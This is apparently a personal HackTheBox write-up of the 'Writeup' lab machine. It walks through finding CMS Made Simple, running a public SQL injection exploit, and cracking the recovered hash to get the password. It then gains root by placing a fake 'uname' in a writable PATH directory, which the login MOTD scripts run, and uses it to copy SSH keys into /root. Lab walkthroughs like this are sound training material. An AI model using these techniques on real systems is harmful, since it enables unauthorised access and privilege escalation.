Writeup was one of the first boxes I did when I joined Hackthebox. It definitely helped to introduce me to basic web enum skills without relying on scripts, exploit finding and local privilege escalation. It had a very interesting path to root, which was tricky to spot but fun to exploit.

**Summary**
**User** - A vulnerability in an open-source content management system allows us to gather hashed credentials, which can be cracked using a wordlist.

**Root** - An MOTD script is run as root when the user account is logged into, which we can take control of.
## User
### Enumeration
We start off with a standard `nmap` scan. Normally I'd leave one running to scan all ports aggressively, but it wasn't necessary in this case.
```
root@clubby789:~# nmap writeup.htb -v
[ ... ]
Discovered open port 80/tcp on 10.10.10.138 <- Web (HTTP)
Discovered open port 22/tcp on 10.10.10.138 <- SSH
```
We'll start of by adding `10.10.10.138 writeup.htb` to our /etc/hosts file to make accessing this site easier.
### Website
Upon visiting `writeup.htb` we are greeted with this page: 
![Main page](/assets/writeup1.png)

So we've got DDoS protection in play. If we produce too many 40x errors, we'll get temporarily banned, which means no automated scanners. At this point, I guessed urls until I came across the fairly obvious `/writeup/`.

A quick read of the HTML finds this in the header:
 `<meta name="Generator" content="CMS Made Simple - Copyright (C) 2004-2019. All rights reserved.">`. At the time, I spotted this quicker because of a very useful Firefox extension [Wappalyzer](https://www.wappalyzer.com/), which identifies many of the client and server-side technologies in use on many sites.
 
### CMSMadeSimple
 After a short search, I found [this script](https://www.exploit-db.com/exploits/46635), which exploits a SQL injection vulnerability in versions of CMSMS 2.2.9 and below. 
```
root@clubby789:~/boxes/writeup# python cms.py -u http://writeup.htb/writeup
[+] Salt for password found: 5a599ef579066807
[+] Username found: jkr
[+] Email found: jkr@writeup.htb
[+] Password found: 62def4866937f08cc13bab43bb14e6f7
```
The script has a built-in function to crack passwords, showing that the format of the hashes was `MD5(PASS+SALT) = HASH` (I found the script to be slow so I dropped the hashes into Hashcat).
`62def4866937f08cc13bab43bb14e6f7:5a599ef579066807` -> `raykayjay9`

```
root@clubby789:~/boxes/writeup# ssh jkr@writeup.htb 
jkr@writeup.htb's password: 
[ ... ]
user.txt
jkr@writeup:~$ cat user.txt 
d4e493....
```
And we've owned user.

## Root
### Local Enumeration
This part was definitely tricky without being on the free servers. Luckily, I was at the time, and was able to take advantage of two things: 

 - Somone had uploaded `pspy64s`, an excellent tool for discovering Cron jobs and other time-based things that may be hard to spot
 - Frequent SSH logins
If I setup two terminal panes, one with `pspy64s` and log in with SSH on the other, we see this:
![Pspy Output](/assets/writeup3.png)
The important part is 
`sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new`:

Every time `jkr` logs in over SSH, this command is run as root!

### Command Hijacking
Let's break this down: 
- `sh -c` runs everything after `-c` in `sh`
- `/usr/bin/env -i PATH=.....` sets the PATH to the given argument.
- `run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new` runs every script in the directory `/etc/update-motd.d`, and pipes the output to the MOTD file.

Inside this directory, we find a single file, `10-uname`, which simply runs:
```
#!/bin/sh
uname -rnsom
```
This directory and all its contents are owned by root and not writable, so no luck there. Let's look into the PATH that gets set, and see if we can hijack anything there. I quickly found I could write files to `/usr/local/sbin/`. Why's this important? Here's a diagram:
```
   writable                       actual location of uname
      |                                     |
      V                                     V                                 
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```
As `uname`'s absolute path is not specified, the system will iterate through the given path to find it, using the first instance it finds. I'll demonstrate this with a quick POC: 
```

jkr@writeup:/tmp$ echo "touch /tmp/test" > /usr/local/sbin/uname
jkr@writeup:/tmp$ chmod +x /usr/local/sbin/uname
[ ... ]

jkr@writeup:/tmp$ ls /tmp/test -la
-rw-r--r-- 1 root root 0 Feb  3 16:16 /tmp/test
```
The file is owned by root, which means we have RCE! From here, it's a quick step to root. I uploaded my public key to `/home/jkr/.ssh/authorized_keys`, ran `echo "mkdir /root/.ssh/; cp /home/jkr/.ssh/authorized_keys /root/.ssh/authorized_keys" > /usr/local/sbin/uname; chmod +x /usr/local/sbin/uname` to create my script, then logged in to `jkr` once more (quickly, as the script gets cleared pretty often). I was then able to log out, and log back in as root!
```
root@clubby789:~# ssh writeup-root 
[ ... ]
root@writeup:~# ls
bin  root.txt
root@writeup:~# cat root.txt 
eeba47f.....
```
And we've owned root

## Final Notes
### SSH Tricks
Recently I've started making use of the SSH config file, to speed up logging in over SSH. Here's what mine looked like for this box:
```
Host writeup
	HostName 10.10.10.138
	User jkr
Host writeup-root
	HostName 10.10.10.138
	User root
```
This allows me to do `ssh writeup` or `ssh writeup-root`. After uploading my public key to `~/.ssh/authorized_keys`, this means I don't even need to enter a password.
### Cleanup script
I'm always interested in seeing how box creators keep their machines stable for other players. While in /root, I noticed `cleanup.pl`, which looks like this:
```
root@writeup:~# cat bin/cleanup.pl 
#!/usr/bin/perl
my $age = 60;
while ($_ = glob('/usr/local/sbin/* /usr/local/bin/*')) {
  next if -d $_;
  my $mtime = (stat($_))[9];
  # delete files older than 3 minutes
  # to try to not spoil others
  if(time-$mtime > $age) {
    unlink($_);
  }
}
```
This checks the age of all files in `/usr/local/sbin (or /usr/local/bin)` and deletes any older than 1 minute ( not 3 as advertised).
